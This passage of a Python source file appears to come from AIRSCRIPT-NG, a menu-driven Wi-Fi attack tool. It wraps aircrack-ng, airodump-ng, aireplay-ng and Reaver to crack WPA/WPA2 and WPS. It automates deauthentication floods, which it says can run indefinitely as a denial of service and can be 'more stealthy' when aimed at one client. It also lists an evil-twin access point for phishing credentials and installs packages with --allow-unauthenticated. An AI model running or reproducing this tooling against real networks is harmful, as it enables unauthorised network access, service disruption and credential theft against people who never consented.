                sou = os.system("sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #By AIRSCRIPT-NG' >> /etc/apt/sources.list") 
                if com == 0 and sou == 0:
                    print("[+] APT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
                    depandancies()
                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file, or use option [10] from the main-menu.")
                    clearScreen()
                else:
                    print("Problems occured when trying to add the repos, reverting to old repo.")
                    if input("Revert? y/n >>").lower().startswith("y"):
                        revert()
                    else:
                        clearScreen()
            else:
                print("Looks like Kali-repos have already been added.")
                depandancies()
        else:
            print("Are you sure this is a debian-based system?")
            print("I didn't find anything for '/etc/apt/sources.list'")
            print("Either your system doesn't use APT or isn't a debian based distro.")
            print("Please try something else.")
            input()
            clearScreen()
    else:
        install_deps()
def reaver():  #Needs minor fixes
    import os, time, subprocess,csv,sys,shlex
    iostream = subprocess.check_output
    call = subprocess.call
    try:
        os.system('clear')
        print("[+] Thanks for chosing reaver")
        print("[-] Please note that Reaver-pixie dust method only works on very few WPS access points worldwide.")
        #print("[-] Please note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
        #print("[+] Despite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
        ack = input("[?] Type 'y' to continue>>")
        if ack.lower().startswith('y'):
            print("[-] Checking for dependancies")
            check_depends()
            gitdeps()
            if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
                os.system("mkdir HANDSHAKES")
            print("[-] All dependancies are met. Make sure you have correct drivers! ")
            time.sleep(1)
            os.system('clear')
            print("""

██████╗ ██╗██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗███████╗████████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝
██████╔╝██║ ╚███╔╝ ██║█████╗      ██║  ██║██║   ██║███████╗   ██║   
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝      ██║  ██║██║   ██║╚════██║   ██║   
██║     ██║██╔╝ ██╗██║███████╗    ██████╔╝╚██████╔╝███████║   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   


[info] Developed by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
            print("Ok lets put a Card in monitor mode\n")
            os.system("sudo systemctl stop NetworkManager.service")
            os.system("sudo systemctl stop wpa_supplicant.service")
            print("[+] your cards are:\n ")
            get_wifi_cards_pick()
            print("\n[info] Ok, seems like %s is started, time to get crackin'" %(index))
            print("[info] Now we'll run wash to find all the wps networks around")
            print("[info] Please press CTRL+C once you see your target network")
            z = input("\nGot all that? Press enter (%srun for 3~ secs minimum%s)%s>>"%(col.green_deep,col.endl,col.endl))
            z = str(z)
            temp_path = iostream('mktemp HANDSHAKES/TEMP_DUMP_XXXX',shell=True).decode('utf-8').rstrip()#fix var name
            dump_path = iostream('mktemp HANDSHAKES/TEMP_DUMP_XXXX',shell=True).decode('utf-8').rstrip()#fix var name
            try:
                call("/usr/bin/env bash -c 'nohup ~/.airscriptNG/air/*/src/airodump-ng -a --wps -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s &>/dev/null &'" %(temp_path,index),shell=True)
                call("~/.airscriptNG/wps/*/src/wash -i %s | tee -a %s" %(index,dump_path),shell=True)
            except(KeyboardInterrupt,EOFError):
                call('killall airodump-ng',shell=True)
                call("/usr/bin/env bash -c 'killall wash && disown'",shell=True) #CONTINUE WHERE LEFT OFF
            #paste stuff here
            csv_array = []
            csv_file = None
            clear = 'clear'
            csv_overlap = iostream('cat %s' %(dump_path),shell=True).decode('utf-8').rstrip().split()
            def get_csv():
                try:
                    x = iostream('ls HANDSHAKES/*csv | wc -l',shell=True).decode('utf-8').rstrip()
                    print('\n\n')
                    for _ in range(1,int(x)+1):
                        csv_array.append(iostream('ls HANDSHAKES/*csv | head -n %s | tail -n 1' %(_),shell=True).decode('utf-8').rstrip())
                    global csv_file_choice
                    csv_file_choice = ('%s-01.csv'  %(temp_path))
                    call(clear)
                    with open(csv_file_choice,newline='') as csvfile:
                        reader = csv.reader(csvfile,delimiter=',')
                        counter_for_csv = 0
                        global value_for_csv_array
                        value_for_csv_array = []
                        vsf = value_for_csv_array
                        for row in reader:
                            if row != [] and len(row) >= 13:
                                if counter_for_csv == 0:
                                    counter_for_csv += 1
                                else:
                                    if row[0].strip() in csv_overlap:
                                        value_for_csv_array.append([row[0].strip(),row[3].strip(),row[5].strip(),row[6].strip(),row[7].strip(),row[8].strip(),row[13].strip()])
                                        counter_for_csv += 1
                        another_counter = 1
                        print('%sViewing all networks:%s\n' %(col.endl_deep,col.endl))
                        print(""" %sNO.%s  %sBSSID%s              %sPWR%s  %sCH%s  %sSECURITY%s %sCIPHER%s %sAUTH%s %sESSID%s\n"""
                            %(col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl))
                        for _ in vsf:
                            for xy in range(1,len(_)):
                                if _[xy] == '':
                                    _[xy] = 'N/A'
                                if len(_[xy].split()) > 1:
                                    _[xy] = _[xy].split()
                                    _[xy] = _[xy][0]
                            if len(_[1]) == 1:
                                _[1] = ' ' + _[1]
                            if int(another_counter) <= 9:
                                another_counter = str(another_counter)
                                another_counter = another_counter + ' '
                            if _[0] in csv_overlap:
                                print(""" %s#%s:%s %s  %s   %s   %s    %s  %s  %s  """
                                %(col.fail,col.endl,another_counter,_[0],_[5],_[1],_[2],_[3],_[4],_[6]))
                                another_counter = int(another_counter)
                                another_counter += 1
                    del csv_array[:]
                    call('rm %s' %(temp_path),shell=True)
                except(TypeError,ValueError):
                    del csv_array[:]
                    get_csv()
            get_csv()
            while True:
                network_select_csv = input('\nPlease enter no(#) of the network you want $')
                try:
                    network_select_csv = int(network_select_csv)
                except(TypeError,ValueError):
                    continue
                finally:
                    if network_select_csv in range(1,len(value_for_csv_array)+1):
                        break     
            b = iostream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX',shell=True).decode('utf-8').rstrip()
            c = value_for_csv_array[network_select_csv-1][1]
            d = value_for_csv_array[network_select_csv-1][0]
            k = value_for_csv_array[network_select_csv-1][-1]
            call('rm %s 2>/dev/null' %(csv_file_choice),shell=True)
            call('rm %s 2>/dev/null' %(temp_path),shell=True)
            call('rm %s 2>/dev/null' %(dump_path),shell=True)
            os.system("clear")
            print("[+]SELECTED NETWORK: %s%s%s" %(col.fail_deep,k,col.endl_deep))
            print("\n[CAP FILE]: %s-01.cap" %(b))
            call('rm %s' %(b),shell=True)
            print("[CHANNEL]: %s" %(c))
            print("[BSSID (AP MAC)]: %s" %(d))
            print("[ESSID (AP SSID)]: %s" %(k))
            print("[CIPHER]: %s" %(value_for_csv_array[network_select_csv-1][-4]))
            print("[SIGNAL STRENGTH]: %s dBm" %(value_for_csv_array[network_select_csv-1][-2]))
            print("[AUTHENTICATION]: %s" %(value_for_csv_array[network_select_csv-1][-3]))
            #stop it. get some help.
            b = str(d)
            c = str(c)
            print('\n')
            def fix():
                print("[info] Once you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
                print("[info] Please note that this can backfire and lock the AP if left for too long")
                print("[info] It should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
                print("\nHow do you want to run it? [1] to run normally or [2] to fix 'FAILED TO ASSOCIATE WITH AP' %s(RECOMMENDED METHOD)%s" %(col.okg,col.endl))
                opt = input("\nChoose either 1 or 2 >>")
                if opt == "1":
                    os.system("~/.airscriptNG/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
                    print("\n[info] By now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                    clearScreen()
                if opt == "2":
                    os.system("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e ~/.airscriptNG/air/*/src/aireplay-ng -1 30 -a %s %s & ~/.airscriptNG/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
                    print("\n[info] By now it has either worked or not. If not then please try option [1]")
                    os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                    #print("\n[info] Please close the Xterm at the top right now, as keeping it on is pretty much useless!")
                    clearScreen()
                else:
                    os.system("clear")
                    fix()
            fix()
        else:
            os.system('clear')
            reaver()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        import traceback
        print("\n[info] Wait a few seconds, cleaning up...")
        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
        os.system("sudo systemctl start NetworkManager.service")
        os.system("sudo systemctl start wpa_supplicant.service")
        os.system("clear")
        #exc_info = sys.exc_info() #ENABLE THIS AND LINE BELOW FOR TRACEBACK
        #traceback.print_exception(*exc_info)
        if input("\n[-] Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
            os.system("rm log.txt 2>/dev/null")
            os._exit(1)
        else:
            os.system("clear")
            title()
            os.system("rm log.txt 2>/dev/null")
def aircrackng(): #Lots of effort needed 
    import os,time,subprocess,csv,sys,shlex
    iostream = subprocess.check_output
    call = subprocess.call
    print("[-] Checking for dependancies")
    check_depends()
    gitdeps()
    print("[-] All dependancies are met. Make sure you have correct drivers! ")
    time.sleep(1)		
    os.system("clear")
    while True:
        try:
            def mainScreen():
                print ("""
    \n

 █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███╗   ██╗ ██████╗ 
██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ████╗  ██║██╔════╝ 
███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝█████╗██╔██╗ ██║██║  ███╗
██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██║╚██╗██║██║   ██║
██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 


[info] Developed by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.                                                                                  
    """)
                #os.system("echo 'Starting...'")
                if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
                    os.system("mkdir HANDSHAKES")
                temp_path = iostream('mktemp HANDSHAKES/TEMP_DUMP_XXXX',shell=True).decode('utf-8').rstrip()
                #print("\nHi, welcome to aircrack-ng made easy")
                print("\nHi, Please read everything that appears at the bottom")
                print("Thanks for using this program")
                os.system("sudo systemctl stop NetworkManager.service")
                os.system("sudo systemctl stop wpa_supplicant.service")
                print("\n[+] your cards are: \n")
                get_wifi_cards_pick()
                print("\n[info] 1) Ok, seems like %s is in monitor mode" %(index))
                print("[info] 2) Now, we'll run Airodump-ng to capture the handshake")
                input("[info] 3) Run it for %s3~ seconds%s and press CTRL+C when you see target network. \n\n[?] press enter to continue >>" %(col.green_deep,col.yel_deep))
                try:
                    subprocess.call("~/.airscriptNG/air/*/src/airodump-ng -a -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s" %(temp_path,index),shell=True)
                except(KeyboardInterrupt,EOFError):
                    pass
                csv_array = []
                csv_file = None
                clear='clear'
                def get_csv():
                    try:
                        x = iostream('ls HANDSHAKES/*csv | wc -l',shell=True).decode('utf-8').rstrip()
                        print('\n\n')
                        for _ in range(1,int(x)+1):
                            csv_array.append(iostream('ls HANDSHAKES/*csv | head -n %s | tail -n 1' %(_),shell=True).decode('utf-8').rstrip())
                        global csv_file_choice
                        csv_file_choice = ('%s-01.csv'  %(temp_path))
                        call(clear)
                        with open(csv_file_choice,newline='') as csvfile:
                            reader = csv.reader(csvfile,delimiter=',')
                            counter_for_csv = 0
                            global value_for_csv_array
                            value_for_csv_array = []
                            vsf = value_for_csv_array
                            for row in reader:
                                if row != [] and len(row) >= 13:
                                    if counter_for_csv == 0:
                                        counter_for_csv += 1
                                    else:
                                        value_for_csv_array.append([row[0].strip(),row[3].strip(),row[5].strip(),row[6].strip(),row[7].strip(),row[8].strip(),row[13].strip()])
                                        counter_for_csv += 1
                            another_counter = 1
                            print('%sViewing all networks:%s\n' %(col.endl_deep,col.endl))
                            print(""" %sNO.%s  %sBSSID%s              %sPWR%s  %sCH%s  %sSECURITY%s %sCIPHER%s %sAUTH%s %sESSID%s\n"""
                                %(col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl))
                            for _ in vsf:
                                for xy in range(1,len(_)):
                                    if _[xy] == '':
                                        _[xy] = 'N/A'
                                    if len(_[xy].split()) > 1:
                                        _[xy] = _[xy].split()
                                        _[xy] = _[xy][0]
                                if len(_[1]) == 1:
                                    _[1] = ' ' + _[1]
                                if another_counter <= 9:
                                    another_counter = str(another_counter)
                                    another_counter = another_counter + ' '
                                print(""" %s#%s:%s %s  %s   %s   %s    %s  %s  %s  """
                                %(col.fail,col.endl,another_counter,_[0],_[5],_[1],_[2],_[3],_[4],_[6]))
                                another_counter = int(another_counter)
                                another_counter += 1
                        del csv_array[:]
                        call('rm %s' %(temp_path),shell=True)
                    except(TypeError,ValueError):
                        del csv_array[:]
                        get_csv()
                get_csv()
                while True:
                    network_select_csv = input('\nPlease enter no(#) of the network you want $')
                    try:
                        network_select_csv = int(network_select_csv)
                    except(TypeError,ValueError):
                        continue
                    finally:
                        if network_select_csv in range(1,len(value_for_csv_array)+1):
                            break     
                b = iostream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX',shell=True).decode('utf-8').rstrip()
                c = value_for_csv_array[network_select_csv-1][1]
                d = value_for_csv_array[network_select_csv-1][0]
                k = value_for_csv_array[network_select_csv-1][-1]
                call('rm %s 2>/dev/null' %(csv_file_choice),shell=True)
                call('rm %s 2>/dev/null' %(temp_path),shell=True)
                #del csv_array[:]
                #print("\nOk, all I need is a few things from you")
                #b = input("[?] First, can you give me a unique filename? [no spaces/punctuation/duplicate name]>> ")
                b = str(b)
                call('rm %s 2>/dev/null' %(b),shell=True)
                #c = input("[?] Now, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>> ")
                c = str(c)
                #d = input("[?] Finally tell me the (copy/paste) bssid of the network [no spaces]>> ")
                d = str(d)
                if b and c and d != "":
                    os.system("clear")
                    print("[+]SELECTED NETWORK: %s%s%s" %(col.fail_deep,k,col.endl_deep))
                    print("\n[CAP FILE]: %s-01.cap" %(b))
                    print("[CHANNEL]: %s" %(c))
                    print("[BSSID (AP MAC)]: %s" %(d))
                    print("[ESSID (AP SSID)]: %s" %(k))
                    print("[CIPHER]: %s" %(value_for_csv_array[network_select_csv-1][-4]))
                    print("[SIGNAL STRENGTH]: %s dBm" %(value_for_csv_array[network_select_csv-1][-2]))
                    print("[AUTHENTICATION]: %s" %(value_for_csv_array[network_select_csv-1][-3]))
                    print("\n[info] We need to de-auth someone. We don't have to, you can wait for someone to connect.")
                    e = input("\n[?] De-auth all [type a], de-auth client [type c], don't de-auth [type n]  ~# ")
                    e = str(e)
                    def post_frame():
                        print("\n\n[info] If you saw [WPA HANDSHAKE: %s] at the top right, then its time to crack the handshake." %(d))
                        while True:
                            #print("\nDo you want to crack using %sCPU/GPU?%s" %(col.warn_deep,col.endl))
                            print("[info] %sIf you use GPU remember the handshake will be in a folder called%s%s \"HANDSHAKES\" %s" %(col.fail,col.endl,col.blue_deep,col.endl))
                            choice_of_cpu_gpu = input("%sCrack using%s: CPU-->[c] (all CPUs)|GPU-->[g] (GTX 9xx,10xx+/AMD ROCM GPU) %s$%s " %(col.blue_deep,col.endl,col.okg,col.endl))
                            if choice_of_cpu_gpu.lower().startswith("c"):
                                break
                            elif choice_of_cpu_gpu.lower().startswith("g"):
                                handshake_func()
                        #print("[info] Please download or locate one ")
                        #print("[info] Hopefully the password will be in there or put it in there")
                        print("[info]%sWe need a wordlist. You can download one from here: %shttps://goo.gl/3UoZ34 %s" %(col.endl,col.blue_deep,col.endl))
                        input("\n[+] Please Specify wordlist. Press [enter] to open file selection  ~# ")
                        def wordlist():
                            from tkinter.filedialog import Tk
                            from tkinter.filedialog import askopenfilename
                            Tk().withdraw()
                            global f
                            f = askopenfilename()
                            f = str(f)
                        wordlist()
                        os.system("clear")
                        print("\n[CAP FILE]: %s-01.cap" %(b))
                        print("[WORDLIST]: %s" %(f))
                        #print("[info] Ok, ready? press enter to start cracking")
                        #print("[info] If nothing is found then ctrl+c and try again")
                        input("\nPress [enter]/CTRL+C ~# ")
                        try:
                            subprocess.call("~/.airscriptNG/air/*/src/aircrack-ng %s-01.cap -w %s" %(b,f),shell=True)
                        except(KeyboardInterrupt,EOFError):
                            print("%s\n^Recieved KeyboardInterrupt/EOF. Cancelling...%s" %(col.fail_deep,col.endl))
                            call('killall aircrack-ng 2>/dev/null',shell=True)
                            #subprocess.call("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null", shell=True)
                        print("\n\n[+] If you see 'KEY FOUND:XXXXXXX', that's the PSK.")
                        print("[+] If the passphrase was not in the dictonary then try option [4] using hashcat.\n")
                        clearScreen()
                    def standard():
                        os.system('clear')
                        global stda 
                        print("[info] How many de-auths do you want to send to the client: %s? Typing '0' will de-auth indefinitely, creating a denial of service." %(g))
                        stda = input("\nPlease enter a number. Around 3-5 is sufficient for a good WiFi-card. ~# ")
                        input("\n[?] ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW. \n\n[PRESS ENTER]  ~# " %(d))
                        os.system("iwconfig %s channel %s" %(index,c))
                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && ~/.airscriptNG/air/*/src/airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                        post_frame()
                    def broadcast_deauth():
                        os.system('clear')
                        global brda 
                        print("[info] How many de-auths do you want to send to all? Typing '0' will de-auth indefinitely, creating a denial of service.")
                        brda = input("\nPlease enter a number. Around 3-5 is sufficient for a good WiFi-card. ~# ")
                        input("\n[?] ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOWor close the window. \n\n[PRESS ENTER]  ~# " %(d))
                        os.system("iwconfig %s channel %s" %(index,c))
                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/aireplay-ng -0 %s -a %s %s --ignore-negative-one && ~/.airscriptNG/air/*/src/airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                        post_frame()
                    def no_deauth():
                        os.system('clear')
                        print("\n[info] You have chosen not to disconnect anyone.")
                        print("[info] You need to wait for someone to connect.")
                        input("\n[info] READY? HIT [ENTER] TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW. ~# " %(d))
                        os.system("\niwconfig %s channel %s" %(index,c))
                        os.system("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                        post_frame()
                    def sta():
                        os.system("gnome-terminal --command='bash -c \"~/.airscriptNG/air/*/src/airodump-ng --bssid %s -c %s --ignore-negative-one %s\"' 2>/dev/null &" %(d,c,index))
                        global g
                        print("\n[info] In the TERMINAL that appears, look at the column where it says bssid/station.")
                        #print("[info] If you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
                        print("[info] You can choose a station address to de-auth/disconnect a specific client rather than all devices on the network")
                        print("[info] This is more stealthy as only one device is being disconnected.")
                        #print("[info] please ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
                        #print("It is optional but you can also leave this blank if you still don't get it")
                        g = input("\n[?] Please copy/paste a station address and hit enter. ~# ")
                        os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                        subprocess.call("kill $(ps a | grep -i \"airodump-ng --bssid\" | awk -F ' ' {'print $1'}) 2>/dev/null",shell=True)
                        g = str(g)
                    if e.lower().startswith("n"):
                        no_deauth()
                    elif e.lower().startswith("a"):
                        broadcast_deauth()
                    elif e.lower().startswith("c"):
                        sta()
                        standard()
                else:
                    input("[-] You missed something, try again. \n[press enter] ~# ")
                    mainScreen()
            mainScreen()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            import traceback
            print("\n[info] Wait a few seconds, cleaning up...")
            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
            os.system("sudo systemctl start NetworkManager.service")
            os.system("sudo systemctl start wpa_supplicant.service")
            os.system("clear")
            #exc_info = sys.exc_info() #ENABLE THIS AND LINE BELOW FOR TRACEBACK
            #traceback.print_exception(*exc_info)
            if input("\n[-] Press [y] to exit or any other key to return to start  ~# ").lower().startswith("y"):
                os.system("rm log.txt 2>/dev/null")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt 2>/dev/null")
def title(): #Works so far
    try:
        import os,subprocess,sys
        from subprocess import check_output
        os.system('clear')
        if os.getuid() != 0:
            print("[?] Not running as root! Please re-run after 'sudo su'\n")
            os._exit(1)
        uname = check_output(["uname","-n"])
        print("\nHello %s%s%s!\n" %(col.warn,uname.decode("utf-8").rstrip(),col.endl))
        unix = subprocess.check_output("cat /proc/cpuinfo | grep -i \"Model name\" | sort | uniq | awk -F ' ' {'print $4,$5,$6,$7,$8,$9,$10'}",shell=True)
        print("%sYour CPU%s: %s%s%s" %(col.fail,col.endl,col.okg,unix.decode("utf-8").rstrip(),col.endl))
        osi = subprocess.check_output("lsb_release -d | awk -F ':' {'print $2'} | tr -d \"\t\"", shell=True)
        print("%sYour OS%s: %s%s%s" %(col.fail,col.endl,col.okg,osi.decode("utf-8").rstrip(),col.endl))
        kernel = subprocess.check_output("uname -r", shell=True)
        print("%sYour Kernel%s: %s%s%s" %(col.fail,col.endl,col.okg,kernel.decode("utf-8").rstrip(),col.endl))
        print("\n[?] What tool would you like to use? Please run as root or after 'sudo su'")
        print("\n-----------------------------------------ATTACKS-----------------------------------------\n")
        print("Type [1] - Aircrack-ng to crack WPA/WPA2")
        print("Type [2] - Reaver with pixie dust to crack WPS (rare vulnerability)")
        print("Type [3] - Host a Evil-Twin/MITM AP to phish credentials, sniff traffic and more.")
        print("Type [4] - Crack an existing WPA/WPA2 handshake using CPU/GPU.")
        print("\n----------------------------------------DOWNLOADS----------------------------------------\n")
        print("Type [5] - Update/upgrade all system packages and this script")
        print("Type [6] - Setup Hashcat and the OpenCL driver to use GPU for cracking")
        print("\n--------------------------------------INSTALLATIONS--------------------------------------\n")
        print("Type [7] - If you used option [8] and terminal broke, use this to fix")
        print("Type [8] - Add an alias to invoke from anywhere")
        print("Type [9] - Add the Kali-Rolling Sources and install any dependancies")
        print("Type [10] - If you used option [9] and APT broke, use this to fix it")
        print("\n\nType [99] - Exit ")
        selection = input("\n|MENU|(Press 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 or 99) >>")
        if selection == "1":
            aircrackng()
        elif selection == "2":
            reaver()
        elif selection == "9":
            install_deps()
        elif selection == "10":
            revert()
        elif selection == "5":
            import os
            os.system("clear")
            if input("\n[+]|MENU|APT_UPDATE|(Update system and perform full-upgrade to system?)  [y/n]>>").lower().startswith("y"):
                os.system("sudo apt-get install xterm apt >/dev/null -y --allow-unauthenticated")
                os.system("sudo xterm $HOLD -title 'Updating, do not close!'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'apt update --allow-unauthenticated;apt full-upgrade -y --allow-unauthenticated;apt autoclean;apt autoremove -y --allow-unauthenticated' ")
                update_this_script()
                print("System is up to date, Goodbye!")
                os.system("rm log.txt 2>/dev/null")
                os._exit(1)
            else:
                title()
        elif selection == "99":
            import os
            log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
            if log == 0:
                os.system("rm log.txt 2>/dev/null")
                os.system("clear")
            else:
                pass
            os._exit(1)
        elif selection == "8":
            aliasfunc()
        elif selection == "7":
            unaliasfunc()
        elif selection == "6":
            def menufunc():
                import os
                print("[-] Checking for dependancies")
                check_depends()
                os.system("clear")
                print("\nType [1] - Download and setup Hashcat to crack WPA/WPA2 handshakes with a NVIDIA-GTX/AMD-RADEON GPU")
                print("Type [2] - Download the OPENCL/OPENGL GPU drivers required by Hashcat")
                print("Type [3] - Install the driver files downloaded from option [2]")
                print("\n\nType [99] - Return to menu")
                sel2 = input("\n|MENU|POST_CRACK|(ENTER CHOICE) ~# ")
                if sel2 == "1":
                    hashcatdownloadfunc()
                if sel2 == "2":
                    driverdownloadfunc()
                if sel2 == "3":
                    drifunc()
                if sel2 == "99":
                    title()
                else:
                    menufunc()
            menufunc()
        elif selection == "3":
            print("\n[-] Checking for dependancies")
            check_depends()
            mitm_fakeap_func()
        elif selection == "4":
            handshake_func()
        #elif selection == "98":
        #    os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
        #    input("\n\nDone. Hit enter ~# ")
        #    title()
        else: 
            os.system('clear')
            title()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        print("\n")
        log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
        if log == 0:
            os.system("rm log.txt 2>/dev/null")
        else:
            pass
        os._exit(1)
title()

